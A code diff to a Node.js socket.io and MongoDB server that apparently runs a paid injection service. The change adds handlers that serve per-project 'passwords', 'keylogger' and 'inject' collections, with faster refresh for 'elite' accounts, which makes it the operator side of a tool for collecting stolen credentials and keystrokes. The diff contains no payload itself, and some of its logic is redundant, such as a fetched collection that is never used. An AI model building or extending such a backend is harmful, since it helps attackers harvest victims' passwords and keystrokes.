@@ -368,6 +368,22 @@ MongoClient.connect(config.mongodb, function (err, db) {
         })
       })
     }
+    var getProjectCollection = (id, collection) => {
+      return new Promise((resolve, reject) => {
+        db.collection(collection, (err, col) => {
+          if (err) throw err
+          col.findOne({
+              for: id
+          }).then(doc => {
+            if (doc !== null) {
+              resolve(doc)
+            } else {
+              resolve(doc)
+            }
+          })
+        })
+      })
+    }
     var injectUpdate = () => {
       socket.emit('inject:clients', inject.clients[injectWatcher])
     }
@@ -527,50 +543,69 @@ MongoClient.connect(config.mongodb, function (err, db) {
 
     socket.on('project:read', project => {
       if (project.name && globalToken) {
-        getUser(globalToken).then(user => {
-          getProject(project.name, user).then(thisProject => {
-            socket.emit('project:read', thisProject.doc)
-            prevState = JSON.stringify(thisProject.doc)
-            database(user).then(doc => {
-              let timeout = 1000
-              // if (doc.payment.account_type.toLowerCase() != "free") {
-              if ((doc.payment.account_type.toLowerCase() === 'elite')) timeout = 100
-              clearInterval(refresh)
-              getProject(project.name, user).then(thisProject => {
-                refresh = setInterval(() => {
-                  getProject(project.name, user).then(thisProject => {
-                    if (JSON.stringify(thisProject.doc) === prevState) return
-                    socket.emit('project:read', thisProject.doc)
-                    prevState = JSON.stringify(thisProject.doc)
-                  }).catch(e => {
-                    socket.emit('err', {
-                      title: e.title,
-                      message: e.message
-                    })
-                  })
-                }, timeout)
-              }).catch(e => {
-                socket.emit('err', {
-                  title: e.title,
-                  message: e.message
+        if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject') {
+          getUser(globalToken).then(user => {
+            getProject(project.name, user).then(thisProject => {
+              if (project.type === 'overview') {
+                socket.emit('project:read', {
+                  type: 'overview',
+                  doc: thisProject.doc
                 })
+              } else {
+                getProjectCollection(thisProject.doc._id, project.type).then(collection => {
+                  socket.emit('project:read', {
+                    type: project.type,
+                    doc: thisProject.doc
+                  })
+                })
+              }
+              prevState = JSON.stringify(thisProject.doc)
+              database(user).then(doc => {
+                let timeout = 1000
+                // if (doc.payment.account_type.toLowerCase() != "free") {
+                if ((doc.payment.account_type.toLowerCase() === 'elite')) timeout = 100
+                clearInterval(refresh)
+                getProject(project.name, user).then(thisProject => {
+                  refresh = setInterval(() => {
+                    getProject(project.name, user).then(thisProject => {
+                      if (JSON.stringify(thisProject.doc) === prevState) return
+                      socket.emit('project:read', thisProject.doc)
+                      prevState = JSON.stringify(thisProject.doc)
+                    }).catch(e => {
+                      socket.emit('err', {
+                        title: e.title,
+                        message: e.message
+                      })
+                    })
+                  }, timeout)
+                }).catch(e => {
+                  socket.emit('err', {
+                    title: e.title,
+                    message: e.message
+                  })
+                })
+                // }
               })
-              // }
+            }).catch(e => {
+              socket.emit('err', {
+                title: e.title,
+                message: e.message
+              })
             })
-          }).catch(e => {
+          }).catch(error => {
+            // Failed to authenticate user with token
+            console.log(chalk.redBright('[project:read] '), error.message)
             socket.emit('err', {
-              title: e.title,
-              message: e.message
+              title: error.title.toString(),
+              message: error.message.toString()
             })
           })
-        }).catch(error => {
-          // Failed to authenticate user with token
-          console.log(chalk.redBright('[project:read] '), error.message)
+        } else {
           socket.emit('err', {
-            title: error.title.toString(),
-            message: error.message.toString()
+            title: 'Invalid request',
+            message: 'Project collection type does not exist'
           })
-        })
+        }
       } else {
         socket.emit('err', {
           title: 'Access denied',
@@ -1215,8 +1250,7 @@ MongoClient.connect(config.mongodb, function (err, db) {
         })
 
         on('ping', pingTime => { // ping
-          let difference = +new Date() - pingTime
-          send('pong', difference)
+          send('pong', pingTime)
         })
       })
 
